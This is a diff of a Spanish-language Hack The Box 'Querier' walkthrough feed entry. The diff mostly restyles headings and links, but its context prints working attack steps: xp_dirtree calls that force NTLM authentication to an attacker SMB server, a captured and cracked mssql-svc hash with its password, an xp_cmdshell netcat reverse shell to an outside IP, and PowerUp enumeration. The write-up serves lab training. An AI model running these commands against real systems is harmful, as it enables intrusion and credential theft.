@@ -107,7 +107,8 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h1 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h1&gt;
+&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
+&lt;h2 id=&#34;masscan&#34;&gt;Masscan&lt;/h2&gt;
 &lt;p&gt;Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -147,10 +148,10 @@ Discovered open port 49671/tcp on 10.10.10.125
 Discovered open port 139/tcp on 10.10.10.125 
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
 &lt;p&gt;Al realizar una busqueda de archivos y directorios en el &lt;code&gt;puerto 5985&lt;/code&gt; no encontramos nada.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_181124.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h1&gt;
+&lt;h2 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h2&gt;
 &lt;p&gt;Enumerando &lt;code&gt;SHARENAMES&lt;/code&gt; con smbclient encontramos &lt;code&gt;Reports&lt;/code&gt; e intentamos conectarnos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -256,9 +257,11 @@ Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&
 &lt;span class=&#34;k&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Sub&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;microsoft-sql-server&#34;&gt;MICROSOFT SQL SERVER&lt;/h1&gt;
+&lt;/div&gt;&lt;h1 id=&#34;microsoft-sql-server&#34;&gt;Microsoft SQL Server&lt;/h1&gt;
 &lt;p&gt;Ya que tenemos credenciales para la base de datos procedemos a utilizar &lt;code&gt;mssqlclient.py&lt;/code&gt; el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por &amp;ldquo;default&amp;rdquo; en Microsoft SQL Server.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/&#34;&gt;&lt;strong&gt;SQL Server Database&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/&#34;&gt;&lt;strong&gt;SQL Server Database&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -297,7 +300,7 @@ volume
 &lt;span class=&#34;nb&#34;&gt;declare&lt;/span&gt; @q varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;99&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; @q&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.14.23\test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; master.dbo.xp_dirtree @q HTTP/1.1
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;local&#34;&gt;LOCAL&lt;/h4&gt;
+&lt;/div&gt;&lt;h2 id=&#34;local&#34;&gt;Local&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -306,7 +309,7 @@ volume
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python smbserver.py -smb2support -port &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt; -ip 10.10.12.220 Me /tmp/me
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;remote&#34;&gt;REMOTE&lt;/h4&gt;
+&lt;/div&gt;&lt;h2 id=&#34;remote&#34;&gt;Remote&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -315,9 +318,11 @@ volume
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;EXEC MASTER.sys.xp_dirtree &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.12.220\Me&amp;#39;&lt;/span&gt;, 1, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478&#34;&gt;&lt;strong&gt;CAPTURE MSSQL CREDENTIALS WITH SMBSERVER&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_230209.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;hashcat&#34;&gt;Hashcat&lt;/h4&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_230209.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478&#34;&gt;&lt;strong&gt;Capture MSSQL Credentials - SMBSERVER&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;hashcat&#34;&gt;Hashcat&lt;/h2&gt;
 &lt;p&gt;Utilizamos hashcat para desencriptar.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -331,7 +336,7 @@ volume
 mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;decrypted&#34;&gt;DECRYPTED&lt;/h4&gt;
+&lt;/div&gt;&lt;p&gt;Valor del hash.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -340,7 +345,7 @@ mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:01010000000
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h1&gt;
+&lt;/div&gt;&lt;h1 id=&#34;user---flag&#34;&gt;User - Flag&lt;/h1&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -373,7 +378,7 @@ output
 c37b41bb669da345bb14de50faab3c16
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;shell-inversa---netcat&#34;&gt;SHELL INVERSA - NETCAT&lt;/h4&gt;
+&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 &lt;p&gt;Utilizando powershell para descargar &lt;code&gt;nc.exe&lt;/code&gt; (netcat) en la computadora.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -392,7 +397,7 @@ c37b41bb669da345bb14de50faab3c16
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd 10.10.12.33 7878&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;local-1&#34;&gt;Local&lt;/h4&gt;
+&lt;/div&gt;&lt;h2 id=&#34;local-1&#34;&gt;Local&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -401,11 +406,13 @@ c37b41bb669da345bb14de50faab3c16
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -lvp &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
 &lt;p&gt;Estando dentro de la maquina como &lt;code&gt;MSSQL-SVC&lt;/code&gt; procedemos a hacer una enumeracion con &lt;code&gt;PowerUp&lt;/code&gt; el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.&lt;/p&gt;
-&lt;h4 id=&#34;powerup&#34;&gt;PowerUp&lt;/h4&gt;
+&lt;h2 id=&#34;powerup&#34;&gt;PowerUp&lt;/h2&gt;
 &lt;p&gt;Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&#34;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&#34;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -621,7 +628,23 @@ b19c3794f786a1fdcf205f81497c3592
             
           
             
+              <category>powershell</category>
+            
+          
+            
               <category>powerup</category>
+            
+          
+            
+              <category>mssqlclient</category>
+            
+          
+            
+              <category>out-of-band</category>
+            
+          
+            
+              <category>SQL Server</category>
             
           
         
